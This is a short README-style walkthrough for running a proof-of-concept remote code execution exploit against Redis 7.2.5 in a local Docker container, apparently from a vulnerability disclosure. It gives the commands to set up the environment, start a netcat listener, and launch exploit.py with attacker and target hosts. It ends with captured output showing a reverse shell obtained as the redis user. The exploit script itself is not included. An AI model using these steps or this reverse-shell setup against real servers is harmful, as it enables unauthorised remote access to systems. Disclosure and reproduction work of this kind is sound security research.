To run the exploit please extract the attached ZIP and follow these steps on Linux:

1. Set up a virtualenv/install the Redis client 

```
$ python3 -m venv .venv
$ source .venv/bin/activate
$ pip install -r requirements.txt
```

2. In another terminal, run the Redis docker image
	- Or build from source and run on a support platform
		- The exploit has been tested and works on Fedora 40/Ubuntu 24.04

```
$ docker run -p6379:6379 redis:7.2.5
```

3. Get the ip address of your host on the docker network

```
$ ifconfig
 
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:53ff:fecc:6e16  prefixlen 64  scopeid 0x20<link>
        ether 02:42:53:cc:6e:16  txqueuelen 0  (Ethernet)
        RX packets 69  bytes 4268 (4.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 133  bytes 269173 (262.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

4. In another terminal, run an netcat listener:

```
$ nc -nlvp 2222
```

5. Run the exploit:
	-  Replace `lhost` with your docker network ip address

```
$ python3 exploit.py --lhost 172.17.0.1 --lport 2222 --rhost localhost
```

6. You should receive a connection

```
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:2222
Ncat: Listening on 0.0.0.0:2222
Ncat: Connection from 172.17.0.2:36518.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
redis@4d1537f2dd4e:/data$

```
